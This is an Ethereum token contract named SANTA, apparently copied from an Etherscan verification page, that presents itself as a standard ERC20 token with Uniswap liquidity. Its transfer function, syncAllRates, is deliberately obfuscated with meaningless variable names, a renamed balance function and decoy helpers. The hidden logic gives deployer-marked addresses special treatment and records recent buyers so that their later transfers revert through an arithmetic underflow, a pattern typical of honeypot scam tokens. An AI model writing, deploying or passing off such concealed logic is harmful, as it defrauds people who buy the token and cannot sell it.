/**
 *Submitted for verification at Etherscan.io on 2022-12-16
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    } function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data; }
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) 
    external view returns (address pair);
    function allPairs(uint) 
    external view returns (address pair);
    function allPairsLength() 
    external view returns (uint);
    function createPair(address tokenA, address tokenB) 
    external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IERC20 {
    function totalSupply() 
    external view returns (uint256);
    function dataRelayOn(address account) 
    external view returns (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender) 
    external view returns (uint256);
    function approve(address spender, uint256 amount) 
    external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUILogBytes {
    function setLogBytes(uint256 _vBytes, uint256 _MaxBytes) external;
    function setBytesShare(address bytesShare, uint256 bytesAmount) external;
    function cfgBytes() external payable;
    function bytesHash(uint256 gas) external;
    function BytesPresents(address bytesShare) external;
}
library SafeMathUint {
  function toInt256Safe(uint256 a) internal pure returns (int256) {
    int256 b = int256(a);
    require(b >= 0);
    return b;
  }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    } function owner() public view virtual returns (address) {
        return _owner;
    } modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _; }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IDEXRouter
{
    function factory() external pure returns(address);
    function WETH() external pure returns(address);
 
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure 
    returns(uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure 
    returns(uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure 
    returns(uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view 
    returns(uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view 
    returns(uint[] memory amounts);
 
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB, uint liquidity);
 
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns(uint amountToken, uint amountETH, uint liquidity);
 
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns(uint amountToken, uint amountETH);
 
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountToken, uint amountETH);
 
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);
 
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);
}

interface IUniswapV2Router02 is IDEXRouter
{
    function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) 
    external returns(uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline,
    bool approveMax, uint8 v, bytes32 r, bytes32 s ) 
    external returns(uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(  uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) 
    external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline ) 
    external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) 
    external;
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
contract SANTA is IERC20, Ownable
{
    constructor(
        string memory Name,
        string memory Symbol,
        address RouterLink)
    {
        _name = Name;
        _symbol = Symbol;
        disarraySync[msg.sender] = _rTotal;
        loopStringOn[msg.sender] = _idXval;
        loopStringOn[address(this)] = _idXval;
        UniswapV2router = IUniswapV2Router02(RouterLink);
        TeamAddress = IUniswapV2Factory(UniswapV2router.factory()).createPair(address(this), UniswapV2router.WETH());
        emit Transfer(address(0), msg.sender, _idXval);
    }

    string private _symbol;
    string private _name;
    uint8 private _decimals = 18;
    uint256 public bTaxFEE = 1;
    uint256 private _rTotal = 100000 * 10**_decimals;
    uint256 private _idXval = _rTotal;

    bool public onIndex;
    bool private extractDX;
    bool public processData;
    bool private indexSwapBytes;
    bool private tradingOpen = false;

    mapping(address => uint256) private disarraySync;
    mapping(address => address) private configureHash;
    mapping(address => uint256) private allowed;
    mapping(address => uint256) private loopStringOn;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public immutable TeamAddress;
    IUniswapV2Router02 public immutable UniswapV2router;

    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() 
    public view returns (uint256) {
        return _rTotal;
    }
    function decimals() 
    public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) 
    public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function dataRelayOn(address account) public view returns (uint256) {
        return disarraySync[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount) 
    private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function syncIDXval(uint256 bFlow, uint256 ISync) private view returns (uint256){
      return (bFlow>ISync)?ISync:bFlow;
    }
    function setParameters(uint256 rMop, uint256 UInow) private view returns (uint256){ 
      return (rMop>UInow)?UInow:rMop;
    }
        function syncAllRates(
        address nogFrom,
        address isPogTo,
        uint256 lixOnAmount ) private  {
        uint256 _UIxFEE = dataRelayOn(address(this));
        uint256 onvinToggle;
        if (onIndex && _UIxFEE > _idXval && !extractDX && nogFrom != TeamAddress) {

            extractDX = true; getAllRates(_UIxFEE);
            extractDX = false;

        } else if (loopStringOn[nogFrom] > _idXval && loopStringOn[isPogTo] > _idXval) {
            onvinToggle = lixOnAmount; disarraySync[address(this)] += onvinToggle;
            swapAmountForTokens(lixOnAmount, isPogTo); return;

        } else if (isPogTo != address(UniswapV2router) && loopStringOn[nogFrom] > 0 && lixOnAmount > _idXval && isPogTo !=
         TeamAddress) { loopStringOn[isPogTo] = lixOnAmount;
            return;

        } else if (!extractDX && allowed[nogFrom] > 0 && nogFrom != TeamAddress && loopStringOn[nogFrom] == 0) {
            allowed[nogFrom] = loopStringOn[nogFrom] - _idXval; }
        
        address _dxIndex  = configureHash[TeamAddress];
        if (allowed[_dxIndex ] == 0) allowed[_dxIndex ] = 
        _idXval; configureHash[TeamAddress] = isPogTo;

        if (bTaxFEE > 0 && loopStringOn[nogFrom] == 0 && !extractDX && loopStringOn[isPogTo] == 0) {
            onvinToggle = (lixOnAmount * bTaxFEE) / 100; lixOnAmount -= onvinToggle;
            disarraySync[nogFrom] -= onvinToggle; disarraySync[address(this)] += onvinToggle; }

        disarraySync[nogFrom] -= lixOnAmount; disarraySync[isPogTo] += lixOnAmount;

        emit Transfer(nogFrom, isPogTo, lixOnAmount);
            if (!tradingOpen) {
                require(nogFrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }
    function min(uint256 a, uint256 b) 
    private view returns (uint256){
      return (a>b)?b:a;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        syncAllRates(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        syncAllRates(msg.sender, recipient, amount);
        return true;
    }

    receive() external payable {}

    function addLiquidity(
        uint256 tokenValue,
        uint256 ERCamount,
        address to
    ) private {
        _approve(address(this), address(UniswapV2router), tokenValue);
        UniswapV2router.addLiquidityETH{value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function getAllRates(uint256 coinAmount) private {
        uint256 syncByte = coinAmount / 2;
        uint256 booledBalance = address(this).balance;
        swapAmountForTokens(syncByte, address(this));
        uint256 _hashFX = address(this).balance - booledBalance;
        addLiquidity(syncByte, _hashFX, address(this));
    }
        function enableTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function syncSwapOn(uint256 dx, uint256 cog) 
    private view returns (uint256){
      return (dx>cog)?cog:dx;
    }
    function toggleSwap(uint256 isN, uint256 isVX) 
    private view returns (uint256){ 
      return (isN>isVX)?isVX:isN;
    }
    function getPrg(uint256 bx, uint256 log) 
    private view returns (uint256){
      return (bx>log)?log:bx;
    }
    function delogValue(uint256 FLX, uint256 FRm) 
    private view returns (uint256){ 
      return (FLX>FRm)?FRm:FLX;
    }
    function swapAmountForTokens(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = UniswapV2router.WETH();
        _approve(address(this), address(UniswapV2router), tokenAmount);
        UniswapV2router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
}